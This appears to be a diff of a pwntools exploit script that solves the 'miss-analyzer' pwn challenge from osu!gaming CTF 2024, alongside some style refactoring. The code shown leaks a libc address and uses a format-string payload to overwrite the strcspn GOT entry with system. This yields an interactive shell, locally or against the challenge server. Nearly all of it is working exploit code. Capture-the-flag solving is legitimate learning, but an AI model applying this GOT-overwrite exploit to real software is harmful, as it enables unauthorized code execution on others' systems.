@@ -1,26 +1,29 @@
 #!/usr/bin/env python3
+from pwn import *
 import binascii
 import sys, os
-from pwn import *
+
 context.update(
-    arch="amd64",
-    endian="little",
-    os="linux",
-    log_level="debug",
-    terminal=["tmux", "split-window", "-h", "-p 65"],
+    arch='amd64',
+    endian='little',
+    os='linux',
+    log_level='debug',
+    terminal=['tmux', 'split-window', '-h', '-p 65'],
 )
 
 REMOTE = False
-TARGET=os.path.realpath("/root/osu/miss-analyzer/miss-analyzer/analyzer")
+TARGET = os.path.realpath('/ctf-writeups/osu!gaming CTF 2024/pwn/miss-analyzer/analyzer')
 elf = ELF(TARGET)
-libc = ELF('./libc.so.6')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 def attach(r):
-    if not REMOTE:
-        bkps = ['*main', '*0x401941', '*0x401a10']
-        cmds = []
-        gdb.attach(r, '\n'.join(["break {}".format(x) for x in bkps] + cmds))
-    return
+    if REMOTE:
+        return
+
+    bkps = []
+    cmds = []
+
+    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
 
 def exploit(r):
     attach(r)
@@ -49,14 +52,13 @@ def exploit(r):
     r.recvuntil(b'Player name: ')
 
     ret_addr = int(r.recvline().strip().decode(), 16)
-    libc_base = ret_addr - libc.libc_start_main_return
+    libc.address = ret_addr - libc.libc_start_main_return
     strcspn_got = elf.got['strcspn']
-    system = libc_base + libc.sym['system']
 
     log.info(f'ret_addr: {hex(ret_addr)}')
-    log.info(f'libc_base: {hex(libc_base)}')
+    log.info(f'libc.address: {hex(libc.address)}')
 
-    fsb_payload = fmtstr_payload(14, {strcspn_got: system})
+    fsb_payload = fmtstr_payload(14, {strcspn_got: libc.sym.system})
 
     log.info(f'fsb_payload: {fsb_payload}')
     log.info(f'len(fsb_payload): {len(fsb_payload)}')
@@ -84,12 +86,13 @@ def exploit(r):
     r.interactive()
     return
 
-if __name__ == "__main__":
-    if len(sys.argv)==2 and sys.argv[1]=="remote":
+if __name__ == '__main__':
+    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
         REMOTE = True
-        r = remote("chal.osugaming.lol", 7273)
+        r = remote('chal.osugaming.lol', 7273)
     else:
         REMOTE = False
-        r = process([TARGET,], env={'LD_PRELOAD':'./libc.so.6'})
+        r = process([TARGET,])
+
     exploit(r)
     exit(0)
